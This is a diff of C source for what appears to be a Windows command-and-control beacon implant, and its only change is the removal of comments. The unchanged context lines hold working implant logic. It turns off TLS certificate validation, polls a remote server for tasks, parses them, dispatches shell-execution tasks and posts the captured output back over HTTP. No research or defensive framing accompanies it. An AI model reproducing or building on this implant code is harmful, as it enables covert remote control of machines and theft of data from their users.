@@ -2,8 +2,6 @@
 #include <stdio.h>
 #include <string.h>
 
-/* ── minimal JSON field extractors ─────────────────────── */
-
 static BOOL json_str(const char *start, const char *end, const char *key,
                      char *buf, int buf_sz) {
     char needle[128];
@@ -38,7 +36,6 @@ static BOOL json_str(const char *start, const char *end, const char *key,
     return FALSE;
 }
 
-/* Heap-allocates and returns the raw (unescaped) string value for key. */
 static char *json_str_heap(const char *start, const char *end,
                             const char *key, int *out_len) {
     char needle[128];
@@ -67,7 +64,6 @@ static char *json_str_heap(const char *start, const char *end,
     return NULL;
 }
 
-/* ── HTTP helpers ───────────────────────────────────────── */
 static void tls_ignore(HINTERNET hReq) {
     DWORD flags = SECURITY_FLAG_IGNORE_UNKNOWN_CA        |
                   SECURITY_FLAG_IGNORE_CERT_DATE_INVALID |
@@ -148,7 +144,6 @@ static void http_post_json(BEACON_CTX *ctx, const wchar_t *path,
     WinHttpCloseHandle(hReq); WinHttpCloseHandle(hConn); WinHttpCloseHandle(hSess);
 }
 
-/* ── JSON-escape helpers ────────────────────────────────── */
 static int json_escape(const char *src, DWORD src_len, char *dst, int dst_sz) {
     int i = 0;
     for (DWORD k = 0; k < src_len && i < dst_sz - 2; k++) {
@@ -165,25 +160,20 @@ static int json_escape(const char *src, DWORD src_len, char *dst, int dst_sz) {
     return i;
 }
 
-/* ── result submission ──────────────────────────────────── */
 void beacon_submit_result(BEACON_CTX *ctx, TASK_RESULT *result) {
     const char *out    = (result->output && result->output_len) ? result->output : "";
     DWORD       out_ln = (result->output && result->output_len) ? result->output_len : 0;
 
-    /* single allocation: prefix + worst-case escaped output + suffix + error */
     SIZE_T body_cap = (SIZE_T)out_ln * 2 + 768;
     char  *body     = (char *)HeapAlloc(GetProcessHeap(), 0, body_cap);
     if (!body) return;
 
-    /* write prefix */
     int off = snprintf(body, body_cap,
         "{\"task_id\":\"%s\",\"beacon_id\":%lu,\"output\":\"",
         result->task_id, (unsigned long)ctx->beacon_id);
 
-    /* escape output inline */
     off += json_escape(out, out_ln, body + off, (int)(body_cap - (SIZE_T)off - 64));
 
-    /* error field */
     off += snprintf(body + off, body_cap - (SIZE_T)off, "\",\"error\":\"");
     off += json_escape(result->error, (DWORD)strlen(result->error),
                        body + off, (int)(body_cap - (SIZE_T)off - 3));
@@ -193,7 +183,6 @@ void beacon_submit_result(BEACON_CTX *ctx, TASK_RESULT *result) {
     HeapFree(GetProcessHeap(), 0, body);
 }
 
-/* ── task poll and dispatch ─────────────────────────────── */
 BOOL beacon_poll_tasks(BEACON_CTX *ctx) {
     wchar_t path[64];
     _snwprintf(path, 64, L"/tasks/%lu", (unsigned long)ctx->beacon_id);
@@ -231,7 +220,6 @@ BOOL beacon_poll_tasks(BEACON_CTX *ctx) {
         }
         if (depth != 0) break;
 
-        /* parse task fields — args and data are heap-allocated */
         PARSED_TASK task;
         memset(&task, 0, sizeof(task));
         json_str(obj_start, obj_end, "task_id", task.task_id, sizeof(task.task_id));
@@ -250,7 +238,6 @@ BOOL beacon_poll_tasks(BEACON_CTX *ctx) {
             task.data = json_str_heap(obj_start, obj_end, "data", &task.data_len);
         }
 
-        /* allocate result — handlers grow output via HeapReAlloc as needed */
         TASK_RESULT *result = (TASK_RESULT *)HeapAlloc(GetProcessHeap(),
                                                         HEAP_ZERO_MEMORY,
                                                         sizeof(TASK_RESULT));
@@ -261,8 +248,6 @@ BOOL beacon_poll_tasks(BEACON_CTX *ctx) {
         result->output_cap = OUT_INIT_CAP;
         result->output_len = 0;
         if (result->output) result->output[0] = '\0';
-
-        /* dispatch */
 
         if (strcmp(task.type, TASK_TYPE_SHELL) == 0) {
             beacon_exec_shell(ctx, &task, result);
